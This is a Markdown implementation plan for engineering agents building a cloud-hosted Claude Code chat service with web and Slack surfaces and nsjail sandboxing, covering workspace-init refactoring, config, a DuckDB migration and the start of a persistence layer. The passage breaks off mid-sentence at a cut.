# Cloud-hosted Claude Code Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship a zero-install web chat at `/chat` and a Slack DM adapter that both run the full Agnes Claude Code harness (skills, marketplace, hooks, slash commands, `agnes` CLI, sub-agents) in nsjail-isolated subprocesses on the Agnes server, with per-user persistent workspaces shared across surfaces.

**Architecture:** Each chat session = one `claude-agent-sdk` Python subprocess on the Agnes server, running in a per-session workdir hydrated from per-user persistent state. nsjail bounds FS / network / syscalls. WebSocket multiplexes stdin/stdout to browser; Slack adapter pipes thread messages through the same `ChatManager`. Pluggable `SandboxProvider` interface keeps E2B/GCP as future implementations.

**Tech Stack:** Python 3.11+, FastAPI, DuckDB, `claude-agent-sdk` (Python), nsjail (Linux), asyncio.subprocess, WebSockets, Jinja2 templates, vanilla JS (highlight.js + marked).

**Reference spec:** `docs/superpowers/specs/2026-05-28-cloud-claude-code-design.md` (read before starting any task).

---

## File Structure

**Create:**

```
src/initial_workspace.py                    # Pure server-side workspace init (refactored)
app/chat/__init__.py
app/chat/provider.py                        # SandboxProvider + SandboxHandle Protocols
app/chat/subprocess_provider.py             # Default impl (nsjail Linux / unjailed darwin)
app/chat/workdir.py                         # WorkdirManager: per-user + per-session dirs
app/chat/persistence.py                     # ChatRepository: chat_sessions/messages/workdirs
app/chat/config.py                          # ChatConfig (loaded from instance.yaml)
app/chat/manager.py                         # ChatManager: session state machine
app/chat/runner.py                          # In-subprocess Python entrypoint
app/chat/audit.py                           # audit_log writer for chat events
app/chat/types.py                           # Shared dataclasses / enums
app/api/chat.py                             # REST + WebSocket endpoints
app/api/slack.py                            # Slack Events webhook + bind endpoint
app/api/admin_chat.py                       # /admin/chat endpoints
app/web/templates/chat.html
app/web/templates/admin_chat.html
app/static/js/chat.js
app/initial_workspace_default/.claude/hooks/pre_tool_use.py   # Bundled safety hook
services/slack_bot/__init__.py
services/slack_bot/bot.py
services/slack_bot/events.py
services/slack_bot/binding.py
services/slack_bot/sender.py
services/slack_bot/sigverify.py             # HMAC verification
services/slack_bot/manifest.yaml            # Slack App manifest
config/nsjail/chat-session.cfg.template     # nsjail config
docs/cloud-chat.md                          # User + admin docs
tests/test_initial_workspace_server.py
tests/test_chat_provider.py
tests/test_chat_subprocess_provider.py
tests/test_chat_workdir.py
tests/test_chat_persistence.py
tests/test_chat_manager.py
tests/test_chat_runner.py
tests/test_chat_api.py
tests/test_chat_api_ws.py
tests/test_admin_chat.py
tests/test_slack_bot.py
tests/test_slack_sigverify.py
tests/test_default_pre_tool_use_hook.py
tests/test_chat_db_migration.py
tests/security/test_nsjail_escape.py
tests/e2e/test_chat_web.py                  # Playwright
```

**Modify:**

```
cli/lib/initial_workspace.py                # Wrap new src/initial_workspace.py
cli/lib/override.py                         # Move is_override_workspace to src/
src/db.py                                   # Migration vN+1 (3 tables, 2 partial indexes)
pyproject.toml                              # Add claude-agent-sdk dependency
app/main.py                                 # Register routers + ChatManager singleton
app/web/router.py                           # GET /chat
app/api/__init__.py                         # Register chat + slack + admin_chat routers
app/auth/access.py                          # Session JWT mint helper
config/instance.yaml.example                # chat: section
docker-compose.yml                          # nsjail volume mount (optional, dev)
CHANGELOG.md                                # [Unreleased] bullet
docs/DEPLOYMENT.md                          # Floor RAM/CPU note
pyproject.toml                              # Version bump (release-cut)
```

---

## Locked interfaces

These types/method signatures are used across multiple phases. Tasks reference them by exact name. If a later task seems to use a different name, that's a bug — fall back to this section.

### `src/initial_workspace.py`

```python
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

@dataclass
class TemplateStatus:
    configured: bool = False
    synced: bool = False
    template_source: Optional[str] = None
    template_sha: Optional[str] = None
    synced_at: Optional[str] = None
    files: list[str] = field(default_factory=list)

@dataclass
class ExtractResult:
    overwritten: list[str] = field(default_factory=list)
    created: list[str] = field(default_factory=list)

def extract_zip_to_workspace(zip_bytes: bytes, workspace: Path) -> ExtractResult: ...

def write_sentinel(
    workspace: Path,
    *,
    agnes_version: str,
    server_url: str,
    template_source: Optional[str],
    template_sha: Optional[str],
    override: bool,
) -> None: ...

def is_override_workspace(workspace: Path) -> bool: ...

def initialize_workspace_from_template(
    workspace: Path,
    template_zip_bytes: bytes,
    *,
    agnes_version: str,
    server_url: str,
    template_source: Optional[str],
    template_sha: Optional[str],
) -> ExtractResult: ...

def initialize_default_workspace(
    workspace: Path,
    *,
    agnes_version: str,
    server_url: str,
    bundled_template_dir: Path,
) -> ExtractResult: ...
```

### `app/chat/types.py`

```python
from dataclasses import dataclass
from datetime import datetime
from enum import Enum
from typing import Optional

class Surface(str, Enum):
    WEB = "web"
    SLACK_DM = "slack_dm"
    SLACK_THREAD = "slack_thread"

class SessionState(str, Enum):
    NEW = "NEW"
    ACTIVE = "ACTIVE"
    IDLE = "IDLE"
    DEAD = "DEAD"

@dataclass
class ChatSession:
    id: str                          # chat_<12-hex>
    user_email: str
    surface: Surface
    slack_channel_id: Optional[str]
    slack_thread_ts: Optional[str]
    title: Optional[str]
    started_at: datetime
    last_message_at: Optional[datetime]
    message_count: int
    archived: bool

@dataclass
class ChatMessage:
    id: str                          # msg_<12-hex>
    session_id: str
    role: str                        # 'user'|'assistant'|'tool_use'|'tool_result'
    content: str
    tool_calls: Optional[list[dict]]
    tokens_in: Optional[int]
    tokens_out: Optional[int]
    model: Optional[str]
    created_at: datetime

@dataclass
class UserWorkdir:
    user_email: str
    last_init_at: Optional[datetime]
    marketplace_sha: Optional[str]
    initial_workspace_sha: Optional[str]
    agnes_version_at_init: Optional[str]
```

### `app/chat/provider.py`

```python
from pathlib import Path
from typing import Protocol
import asyncio

class SandboxHandle(Protocol):
    pid: int
    stdin: asyncio.StreamWriter
    stdout: asyncio.StreamReader
    stderr: asyncio.StreamReader
    async def wait(self) -> int: ...
    async def kill(self, *, grace_sec: float = 5.0) -> None: ...

class SandboxProvider(Protocol):
    async def spawn(
        self,
        *,
        workdir: Path,
        env: dict[str, str],
        argv: list[str],
    ) -> SandboxHandle: ...
```

### `app/chat/manager.py`

```python
class ChatManager:
    def __init__(
        self,
        provider: SandboxProvider,
        workdir_mgr: WorkdirManager,
        repo: ChatRepository,
        config: ChatConfig,
    ): ...
    async def create_session(
        self, user_email: str, surface: Surface, *,
        slack_channel_id: Optional[str] = None,
        slack_thread_ts: Optional[str] = None,
        title: Optional[str] = None,
    ) -> ChatSession: ...
    async def attach(self, chat_id: str, ws) -> None: ...
    async def send_user_message(self, chat_id: str, text: str) -> None: ...
    async def cancel(self, chat_id: str) -> None: ...
    async def kill(self, chat_id: str, *, reason: str) -> None: ...
    async def shutdown(self) -> None: ...
    def list_live(self) -> list["LiveSession"]: ...
```

---

## Phase 0 — Pre-work refactors (Track A first commits)

Per spec § "Pre-work refactors": extract pure logic from
`cli/lib/initial_workspace.py` so server can re-use it. These commits
land first — Tracks B/C/D do not start until Phase 0 + Phase 5.1
(ChatManager interface skeleton) are merged into the working branch.

### Task 0.1: Extract pure workspace-init logic to `src/initial_workspace.py`

**Files:**
- Create: `src/initial_workspace.py`
- Modify: `cli/lib/initial_workspace.py`
- Modify: `cli/lib/override.py:1-40` (move `is_override_workspace`)
- Test:   `tests/test_initial_workspace_server.py`

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_initial_workspace_server.py
import io
import zipfile
from pathlib import Path

from src.initial_workspace import (
    extract_zip_to_workspace,
    initialize_default_workspace,
    initialize_workspace_from_template,
    is_override_workspace,
    write_sentinel,
)


def _make_zip(entries: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, payload in entries.items():
            zf.writestr(name, payload)
    return buf.getvalue()


def test_extract_zip_creates_files(tmp_path: Path):
    zip_bytes = _make_zip({"CLAUDE.md": b"hi", ".claude/settings.json": b"{}"})
    result = extract_zip_to_workspace(zip_bytes, tmp_path)
    assert (tmp_path / "CLAUDE.md").read_bytes() == b"hi"
    assert (tmp_path / ".claude/settings.json").read_bytes() == b"{}"
    assert sorted(result.created) == [".claude/settings.json", "CLAUDE.md"]
    assert result.overwritten == []


def test_extract_zip_rejects_traversal(tmp_path: Path):
    zip_bytes = _make_zip({"../escape.txt": b"x"})
    try:
        extract_zip_to_workspace(zip_bytes, tmp_path)
    except ValueError as exc:
        assert "unsafe" in str(exc).lower()
    else:
        raise AssertionError("expected ValueError on traversal entry")


def test_write_sentinel_records_metadata(tmp_path: Path):
    write_sentinel(
        tmp_path,
        agnes_version="0.55.0",
        server_url="https://agnes.example.com",
        template_source="https://github.com/example/tpl",
        template_sha="abc123",
        override=True,
    )
    sentinel = (tmp_path / ".claude" / "init-complete").read_text()
    assert "agnes_version: 0.55.0" in sentinel
    assert "override: true" in sentinel
    assert "template_sha: abc123" in sentinel
    assert is_override_workspace(tmp_path) is True


def test_is_override_workspace_false_when_missing(tmp_path: Path):
    assert is_override_workspace(tmp_path) is False


def test_initialize_workspace_from_template_writes_files_and_sentinel(tmp_path: Path):
    zip_bytes = _make_zip({"CLAUDE.md": b"hello"})
    result = initialize_workspace_from_template(
        tmp_path,
        zip_bytes,
        agnes_version="0.55.0",
        server_url="https://example",
        template_source="src",
        template_sha="sha",
    )
    assert (tmp_path / "CLAUDE.md").read_text() == "hello"
    assert is_override_workspace(tmp_path) is True
    assert result.created == ["CLAUDE.md"]


def test_initialize_default_workspace_copies_bundled(tmp_path: Path):
    bundled = tmp_path / "bundled"
    bundled.mkdir()
    (bundled / "CLAUDE.md").write_text("default")
    (bundled / ".claude").mkdir()
    (bundled / ".claude" / "settings.json").write_text("{}")
    workspace = tmp_path / "ws"
    result = initialize_default_workspace(
        workspace,
        agnes_version="0.55.0",
        server_url="https://example",
        bundled_template_dir=bundled,
    )
    assert (workspace / "CLAUDE.md").read_text() == "default"
    assert (workspace / ".claude/settings.json").read_text() == "{}"
    assert (workspace / ".claude/init-complete").exists()
    # default init writes override=false
    assert "override: false" in (workspace / ".claude/init-complete").read_text()
```

- [ ] **Step 2: Run tests, confirm they fail**

Run: `.venv/bin/pytest tests/test_initial_workspace_server.py -v`
Expected: `ImportError: cannot import name 'extract_zip_to_workspace' from 'src.initial_workspace'`

- [ ] **Step 3: Implement `src/initial_workspace.py`**

```python
"""Server-callable workspace initialization logic.

Pure (no typer, no prompts, no CLI dependencies). The CLI half in
``cli/lib/initial_workspace.py`` wraps these functions and adds
client-side confirmation prompts. The chat manager calls them
directly when hydrating a per-user workdir.
"""
from __future__ import annotations

import io
import shutil
import zipfile
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional


@dataclass
class TemplateStatus:
    configured: bool = False
    synced: bool = False
    template_source: Optional[str] = None
    template_sha: Optional[str] = None
    synced_at: Optional[str] = None
    files: list[str] = field(default_factory=list)


@dataclass
class ExtractResult:
    overwritten: list[str] = field(default_factory=list)
    created: list[str] = field(default_factory=list)


def extract_zip_to_workspace(zip_bytes: bytes, workspace: Path) -> ExtractResult:
    """Validate then extract every zip entry into ``workspace``.

    Rejects ``..`` traversal, absolute paths, and entries that resolve
    outside ``workspace``. Raises ``ValueError`` with a short message
    if any entry is unsafe (caller decides how to surface).
    """
    workspace = workspace.resolve()
    workspace.mkdir(parents=True, exist_ok=True)
    overwritten: list[str] = []
    created: list[str] = []

    with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
        for info in zf.infolist():
            name = info.filename
            if not name or name.endswith("/"):
                continue
            if name.startswith("/") or ".." in name.split("/"):
                raise ValueError(f"unsafe zip entry: {name!r}")
            target = (workspace / name).resolve()
            try:
                target.relative_to(workspace)
            except ValueError as exc:
                raise ValueError(f"unsafe zip entry escapes workspace: {name!r}") from exc

        for info in zf.infolist():
            name = info.filename
            if not name or name.endswith("/"):
                continue
            target = workspace / name
            (overwritten if target.exists() else created).append(name)
            target.parent.mkdir(parents=True, exist_ok=True)
            with zf.open(info) as src, open(target, "wb") as dst:
                while chunk := src.read(65536):
                    dst.write(chunk)

    return ExtractResult(overwritten=sorted(overwritten), created=sorted(created))


def write_sentinel(
    workspace: Path,
    *,
    agnes_version: str,
    server_url: str,
    template_source: Optional[str],
    template_sha: Optional[str],
    override: bool,
) -> None:
    """Write ``.claude/init-complete`` marking the workspace as initialized."""
    sentinel = workspace / ".claude" / "init-complete"
    sentinel.parent.mkdir(parents=True, exist_ok=True)
    sentinel.write_text(
        f"completed_at: {datetime.now(timezone.utc).isoformat()}\n"
        f"agnes_version: {agnes_version}\n"
        f"server_url: {server_url}\n"
        f"override: {'true' if override else 'false'}\n"
        f"template_source: {template_source or ''}\n"
        f"template_sha: {template_sha or ''}\n",
        encoding="utf-8",
    )


def is_override_workspace(workspace: Path) -> bool:
    sentinel = workspace / ".claude" / "init-complete"
    if not sentinel.exists():
        return False
    try:
        text = sentinel.read_text(encoding="utf-8")
    except OSError:
        return False
    for line in text.splitlines():
        if line.strip() == "override: true":
            return True
    return False


def initialize_workspace_from_template(
    workspace: Path,
    template_zip_bytes: bytes,
    *,
    agnes_version: str,
    server_url: str,
    template_source: Optional[str],
    template_sha: Optional[str],
) -> ExtractResult:
    result = extract_zip_to_workspace(template_zip_bytes, workspace)
    write_sentinel(
        workspace,
        agnes_version=agnes_version,
        server_url=server_url,
        template_source=template_source,
        template_sha=template_sha,
        override=True,
    )
    return result


def initialize_default_workspace(
    workspace: Path,
    *,
    agnes_version: str,
    server_url: str,
    bundled_template_dir: Path,
) -> ExtractResult:
    workspace.mkdir(parents=True, exist_ok=True)
    overwritten: list[str] = []
    created: list[str] = []
    bundled_template_dir = bundled_template_dir.resolve()

    for src in bundled_template_dir.rglob("*"):
        if not src.is_file():
            continue
        rel = src.relative_to(bundled_template_dir)
        dst = workspace / rel
        (overwritten if dst.exists() else created).append(str(rel))
        dst.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(src, dst)

    write_sentinel(
        workspace,
        agnes_version=agnes_version,
        server_url=server_url,
        template_source=None,
        template_sha=None,
        override=False,
    )
    return ExtractResult(overwritten=sorted(overwritten), created=sorted(created))
```

- [ ] **Step 4: Rewire `cli/lib/initial_workspace.py` to delegate**

In `cli/lib/initial_workspace.py`, replace the inline implementations
of `extract_zip_to_workspace` and `write_override_sentinel` with
imports from `src.initial_workspace`:

```python
# At top of file
from src.initial_workspace import (
    ExtractResult,
    extract_zip_to_workspace,
    initialize_workspace_from_template,
    write_sentinel,
)
```

Replace the file-local definitions of `extract_zip_to_workspace` and
`write_override_sentinel` with thin wrappers that surface
`typer.Exit(1)` on `ValueError` from the pure function:

```python
def extract_zip_to_workspace_cli(zip_bytes: bytes, workspace: Path) -> ExtractResult:
    try:
        return extract_zip_to_workspace(zip_bytes, workspace)
    except ValueError as exc:
        typer.echo(
            render_error(
                0,
                {"detail": {"kind": "initial_workspace_unsafe_entry", "hint": str(exc)}},
            ),
            err=True,
        )
        raise typer.Exit(1) from exc
```

Update `apply_override` to call `initialize_workspace_from_template`
internally after the typer prompt + audit call:

```python
def apply_override(
    workspace: Path, status: StatusInfo, server_url: str, token: str,
    *, force: bool, agnes_version: str,
) -> ExtractResult:
    # ... existing pre-checks (sync, force-overwrite prompt) ...
    zip_bytes = download_zip(server_url, token)
    try:
        result = initialize_workspace_from_template(
            workspace,
            zip_bytes,
            agnes_version=agnes_version,
            server_url=server_url,
            template_source=status.template_source,
            template_sha=status.template_sha,
        )
    except ValueError as exc:
        typer.echo(render_error(0, {"detail": {"kind": "initial_workspace_unsafe_entry", "hint": str(exc)}}), err=True)
        raise typer.Exit(1) from exc
    report_applied(
        server_url, token,
        mode="force_overwrite" if is_force_overwrite else "fresh_install",
        template_sha=status.template_sha,
        overwritten_count=len(result.overwritten),
        created_count=len(result.created),
    )
    return result
```

- [ ] **Step 5: Move `is_override_workspace` from `cli/lib/override.py`**

In `cli/lib/override.py`, replace the body of `is_override_workspace`
with a re-export:

```python
from src.initial_workspace import is_override_workspace  # re-export

__all__ = ["is_override_workspace"]
```

Verify by grep: `grep -rn "from cli.lib.override import is_override_workspace" --include='*.py'` — no breakage.

- [ ] **Step 6: Run server tests + CLI tests**

```
.venv/bin/pytest tests/test_initial_workspace_server.py tests/test_initial_workspace.py tests/test_cli_init.py -v
```
Expected: all green.

- [ ] **Step 7: Commit**

```
git add src/initial_workspace.py cli/lib/initial_workspace.py cli/lib/override.py \
        tests/test_initial_workspace_server.py
git commit -m "refactor(initial-workspace): extract pure server-callable logic to src/

CLI wrapper keeps typer prompt + error rendering; pure functions are
now usable from the chat manager's server-side workdir hydration."
```

### Task 0.2: Add `claude-agent-sdk` dependency

**Files:**
- Modify: `pyproject.toml`

- [ ] **Step 1: Add dependency**

Add to `pyproject.toml` under `[project] dependencies` (alphabetical):

```toml
"claude-agent-sdk>=0.4.0,<0.5.0",
```

Pin minor version to avoid surprise API breaks (per architect §4.4).

- [ ] **Step 2: Install + verify import**

```
.venv/bin/uv pip install -e ".[dev]"
.venv/bin/python -c "import claude_agent_sdk; print(claude_agent_sdk.__version__)"
```

Expected: prints the installed version.

- [ ] **Step 3: Commit**

```
git add pyproject.toml
git commit -m "deps: add claude-agent-sdk for in-process chat sessions"
```

### Task 0.3: Bootstrap `chat:` config block + `app/chat/config.py`

**Files:**
- Create: `app/chat/__init__.py` (empty)
- Create: `app/chat/config.py`
- Modify: `config/instance.yaml.example`
- Test:   `tests/test_chat_config.py`

- [ ] **Step 1: Write failing test**

```python
# tests/test_chat_config.py
from pathlib import Path

from app.chat.config import ChatConfig, load_chat_config


def test_default_disabled(tmp_path: Path):
    yaml = tmp_path / "instance.yaml"
    yaml.write_text("instance_name: test\n")
    cfg = load_chat_config(yaml)
    assert cfg.enabled is False
    assert cfg.require_isolation is True
    assert cfg.concurrency_per_user == 3
    assert cfg.idle_ttl_seconds == 1800
    assert cfg.per_tool_call_seconds == 90
    assert cfg.per_session_bq_scan_bytes == 20 * 1024**3
    assert cfg.daily_anthropic_spend_usd == 20.0


def test_enabled_with_overrides(tmp_path: Path):
    yaml = tmp_path / "instance.yaml"
    yaml.write_text(
        "instance_name: test\n"
        "chat:\n"
        "  enabled: true\n"
        "  require_isolation: false\n"
        "  concurrency_per_user: 5\n"
        "  idle_ttl_seconds: 900\n"
    )
    cfg = load_chat_config(yaml)
    assert cfg.enabled is True
    assert cfg.require_isolation is False
    assert cfg.concurrency_per_user == 5
    assert cfg.idle_ttl_seconds == 900
```

- [ ] **Step 2: Verify failing**

Run: `.venv/bin/pytest tests/test_chat_config.py -v`
Expected: `ModuleNotFoundError: No module named 'app.chat.config'`

- [ ] **Step 3: Implement `app/chat/config.py`**

```python
"""Chat feature config (loaded from instance.yaml `chat:` block)."""
from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path

import yaml


@dataclass(frozen=True)
class ChatConfig:
    enabled: bool = False
    require_isolation: bool = True
    concurrency_per_user: int = 3
    idle_ttl_seconds: int = 30 * 60
    per_tool_call_seconds: int = 90
    per_session_bq_scan_bytes: int = 20 * 1024**3
    daily_anthropic_spend_usd: float = 20.0
    max_session_seconds: int = 4 * 3600
    max_session_tokens: int = 200_000
    rate_messages_per_hour: int = 100
    tool_calls_per_turn_budget: int = 50
    marketplace_sha_debounce_seconds: int = 5 * 60


def load_chat_config(instance_yaml: Path) -> ChatConfig:
    if not instance_yaml.exists():
        return ChatConfig()
    data = yaml.safe_load(instance_yaml.read_text()) or {}
    raw = data.get("chat", {}) or {}
    return ChatConfig(
        enabled=bool(raw.get("enabled", False)),
        require_isolation=bool(raw.get("require_isolation", True)),
        concurrency_per_user=int(raw.get("concurrency_per_user", 3)),
        idle_ttl_seconds=int(raw.get("idle_ttl_seconds", 30 * 60)),
        per_tool_call_seconds=int(raw.get("per_tool_call_seconds", 90)),
        per_session_bq_scan_bytes=int(raw.get("per_session_bq_scan_bytes", 20 * 1024**3)),
        daily_anthropic_spend_usd=float(raw.get("daily_anthropic_spend_usd", 20.0)),
        max_session_seconds=int(raw.get("max_session_seconds", 4 * 3600)),
        max_session_tokens=int(raw.get("max_session_tokens", 200_000)),
        rate_messages_per_hour=int(raw.get("rate_messages_per_hour", 100)),
        tool_calls_per_turn_budget=int(raw.get("tool_calls_per_turn_budget", 50)),
        marketplace_sha_debounce_seconds=int(raw.get("marketplace_sha_debounce_seconds", 5 * 60)),
    )
```

- [ ] **Step 4: Extend `config/instance.yaml.example`**

Append a documented `chat:` section:

```yaml
# Cloud-hosted Claude Code (web /chat + Slack adapter). Off by default;
# turn on per-instance once you've sized the host for chat workloads
# (see docs/DEPLOYMENT.md § cloud-chat host requirements).
chat:
  enabled: false
  require_isolation: true             # refuse unjailed subprocess on Linux
  concurrency_per_user: 3
  idle_ttl_seconds: 1800              # 30 min
  per_tool_call_seconds: 90
  per_session_bq_scan_bytes: 21474836480   # 20 GiB
  daily_anthropic_spend_usd: 20.0
  max_session_seconds: 14400
  max_session_tokens: 200000
  rate_messages_per_hour: 100
  tool_calls_per_turn_budget: 50
  marketplace_sha_debounce_seconds: 300
```

- [ ] **Step 5: Run tests**

```
.venv/bin/pytest tests/test_chat_config.py -v
```

Expected: green.

- [ ] **Step 6: Commit**

```
git add app/chat/__init__.py app/chat/config.py config/instance.yaml.example \
        tests/test_chat_config.py
git commit -m "feat(chat): config block + ChatConfig dataclass (feature off by default)"
```

---

## Phase 1 — DB migration (chat_sessions / chat_messages / user_workdirs)

Auto-migrating schema lives in `src/db.py` as a sequence of version
steps (per CLAUDE.md). Bump current version to N+1; add three tables
and two partial unique indexes per spec § Data model.

### Task 1.1: Migration step + types module + repository skeleton tests

**Files:**
- Create: `app/chat/types.py`
- Modify: `src/db.py` (one new migration step)
- Test:   `tests/test_chat_db_migration.py`

- [ ] **Step 1: Add `app/chat/types.py`**

```python
"""Chat-feature shared dataclasses and enums (referenced cross-module)."""
from __future__ import annotations

from dataclasses import dataclass
from datetime import datetime
from enum import Enum
from typing import Optional


class Surface(str, Enum):
    WEB = "web"
    SLACK_DM = "slack_dm"
    SLACK_THREAD = "slack_thread"


class SessionState(str, Enum):
    NEW = "NEW"
    ACTIVE = "ACTIVE"
    IDLE = "IDLE"
    DEAD = "DEAD"


@dataclass
class ChatSession:
    id: str
    user_email: str
    surface: Surface
    slack_channel_id: Optional[str]
    slack_thread_ts: Optional[str]
    title: Optional[str]
    started_at: datetime
    last_message_at: Optional[datetime]
    message_count: int
    archived: bool


@dataclass
class ChatMessage:
    id: str
    session_id: str
    role: str
    content: str
    tool_calls: Optional[list[dict]]
    tokens_in: Optional[int]
    tokens_out: Optional[int]
    model: Optional[str]
    created_at: datetime


@dataclass
class UserWorkdir:
    user_email: str
    last_init_at: Optional[datetime]
    marketplace_sha: Optional[str]
    initial_workspace_sha: Optional[str]
    agnes_version_at_init: Optional[str]
```

- [ ] **Step 2: Write failing migration test**

```python
# tests/test_chat_db_migration.py
import duckdb
from pathlib import Path

from src.db import _CURRENT_SCHEMA_VERSION, migrate, open_db


def test_migration_creates_chat_tables(tmp_path: Path):
    db_path = tmp_path / "system.duckdb"
    conn = open_db(db_path)
    migrate(conn)

    tables = {row[0] for row in conn.execute("SHOW TABLES").fetchall()}
    assert "chat_sessions" in tables
    assert "chat_messages" in tables
    assert "user_workdirs" in tables

    cols = {row[0] for row in conn.execute("PRAGMA table_info(chat_sessions)").fetchall()}
    assert {
        "id", "user_email", "surface", "slack_channel_id", "slack_thread_ts",
        "title", "started_at", "last_message_at", "message_count", "archived",
    }.issubset(cols)


def test_partial_unique_index_dedupes_slack_dm(tmp_path: Path):
    db_path = tmp_path / "system.duckdb"
    conn = open_db(db_path)
    migrate(conn)

    conn.execute(
        "INSERT INTO chat_sessions(id, user_email, surface, slack_channel_id, slack_thread_ts,"
        " started_at, message_count, archived) VALUES "
        "('chat_a', 'u@x', 'slack_dm', 'C1', NULL, CURRENT_TIMESTAMP, 0, FALSE)"
    )

    try:
        conn.execute(
            "INSERT INTO chat_sessions(id, user_email, surface, slack_channel_id, slack_thread_ts,"
            " started_at, message_count, archived) VALUES "
            "('chat_b', 'u@x', 'slack_dm', 'C1', NULL, CURRENT_TIMESTAMP, 0, FALSE)"
        )
    except duckdb.ConstraintException:
        pass
    else:
        raise AssertionError("expected unique constraint to fire for second slack_dm row")


def test_partial_unique_allows_multiple_web(tmp_path: Path):
    db_path = tmp_path / "system.duckdb"
    conn = open_db(db_path)
    migrate(conn)

    for chat_id in ("chat_a", "chat_b"):
        conn.execute(
            "INSERT INTO chat_sessions(id, user_email, surface, slack_channel_id, slack_thread_ts,"
            " started_at, message_count, archived) VALUES "
            "(?, 'u@x', 'web', NULL, NULL, CURRENT_TIMESTAMP, 0, FALSE)",
            [chat_id],
        )

    n = conn.execute("SELECT COUNT(*) FROM chat_sessions WHERE surface='web'").fetchone()[0]
    assert n == 2


def test_cascade_deletes_messages(tmp_path: Path):
    db_path = tmp_path / "system.duckdb"
    conn = open_db(db_path)
    migrate(conn)
    conn.execute(
        "INSERT INTO chat_sessions(id, user_email, surface, slack_channel_id, slack_thread_ts,"
        " started_at, message_count, archived) VALUES "
        "('chat_a', 'u@x', 'web', NULL, NULL, CURRENT_TIMESTAMP, 0, FALSE)"
    )
    conn.execute(
        "INSERT INTO chat_messages(id, session_id, role, content, created_at) VALUES "
        "('msg_a', 'chat_a', 'user', 'hi', CURRENT_TIMESTAMP)"
    )
    conn.execute("DELETE FROM chat_sessions WHERE id='chat_a'")
    n = conn.execute("SELECT COUNT(*) FROM chat_messages").fetchone()[0]
    assert n == 0
```

- [ ] **Step 3: Run, confirm failing**

`.venv/bin/pytest tests/test_chat_db_migration.py -v`
Expected: tables not found.

- [ ] **Step 4: Add migration step in `src/db.py`**

Locate the existing `_MIGRATIONS` list (per CLAUDE.md mention). Append:

```python
def _migrate_to_vN_plus_1(conn: duckdb.DuckDBPyConnection) -> None:
    """v{N+1}: cloud chat sessions, messages, per-user workdir markers."""
    conn.execute("""
        CREATE TABLE IF NOT EXISTS chat_sessions (
            id              VARCHAR PRIMARY KEY,
            user_email      VARCHAR NOT NULL,
            surface         VARCHAR NOT NULL,
            slack_channel_id VARCHAR,
            slack_thread_ts  VARCHAR,
            title           VARCHAR,
            started_at      TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
            last_message_at TIMESTAMP,
            message_count   INTEGER NOT NULL DEFAULT 0,
            archived        BOOLEAN NOT NULL DEFAULT FALSE
        );
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS chat_messages (
            id          VARCHAR PRIMARY KEY,
            session_id  VARCHAR NOT NULL REFERENCES chat_sessions(id) ON DELETE CASCADE,
            role        VARCHAR NOT NULL,
            content     TEXT NOT NULL,
            tool_calls  JSON,
            tokens_in   INTEGER,
            tokens_out  INTEGER,
            model       VARCHAR,
            created_at  TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
        );
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS user_workdirs (
            user_email             VARCHAR PRIMARY KEY,
            last_init_at           TIMESTAMP,
            marketplace_sha        VARCHAR,
            initial_workspace_sha  VARCHAR,
            agnes_version_at_init  VARCHAR
        );
    """)
    conn.execute("CREATE INDEX IF NOT EXISTS idx_chat_messages_session ON chat_messages(session_id, created_at);")
    conn.execute("CREATE INDEX IF NOT EXISTS idx_chat_sessions_user ON chat_sessions(user_email, last_message_at DESC);")
    # Partial unique indexes — see spec § Data model for the DuckDB
    # NULL-semantics rationale.
    conn.execute("""
        CREATE UNIQUE INDEX IF NOT EXISTS uq_chat_slack_dm
        ON chat_sessions (slack_channel_id)
        WHERE surface = 'slack_dm' AND archived = FALSE;
    """)
    conn.execute("""
        CREATE UNIQUE INDEX IF NOT EXISTS uq_chat_slack_thread
        ON chat_sessions (slack_channel_id, slack_thread_ts)
        WHERE surface = 'slack_thread' AND archived = FALSE;
    """)


# Append to the ordered migrations list:
_MIGRATIONS.append((current_version_int + 1, _migrate_to_vN_plus_1))
_CURRENT_SCHEMA_VERSION = current_version_int + 1
```

(Devin reading: replace `current_version_int` with the actual current
`_CURRENT_SCHEMA_VERSION` value at time of work. The existing
`_MIGRATIONS` registry pattern is the single source of truth — do not
duplicate or renumber.)

- [ ] **Step 5: Verify all four tests pass**

`.venv/bin/pytest tests/test_chat_db_migration.py -v`

Expected: all green.

- [ ] **Step 6: Commit**

```
git add app/chat/types.py src/db.py tests/test_chat_db_migration.py
git commit -m "feat(chat): DB migration v{N+1} — chat_sessions, chat_messages, user_workdirs

Partial unique indexes per-surface (DuckDB NULL semantics); FK cascade
on chat_messages so GDPR hard-delete sweeps transcripts cleanly."
```

---

## Phase 2 — Persistence layer (ChatRepository)

`ChatRepository` is the only place that talks to DuckDB for chat
state. Manager + API + Slack go through it. Acquires the existing
`system.duckdb` connection from `app/db.py` (or wherever Agnes's
shared connection lives — Devin: grep for `get_system_db_conn` or
`open_system_db` to find the canonical accessor).

### Task 2.1: ChatRepository — sessions CRUD

> **DB-constraint reality check (Task 1.1 surfaced this — applied 2026-05-28):**
> DuckDB 1.5.3 does NOT support partial unique indexes or `ON DELETE
> CASCADE`. Per-surface Slack uniqueness and hard-delete cascade
> therefore MUST be enforced in this Python layer, not by the schema.
>
> **Slack uniqueness atomicity rule.** `create_session` for
> `surface=slack_dm` or `surface=slack_thread` MUST do the check-then-
> insert with **no `await` between the SELECT and the INSERT** — that
> way, under the spec's single-worker constraint, the asyncio event
> loop cannot switch tasks between the two statements. Concretely: do
> both queries via the synchronous `duckdb.DuckDBPyConnection.execute`
> calls back-to-back; do not interleave any await on a network call,
> file I/O, or `asyncio.sleep`. Add a code comment at the call site
> stating "intentional: no await between SELECT and INSERT — Slack
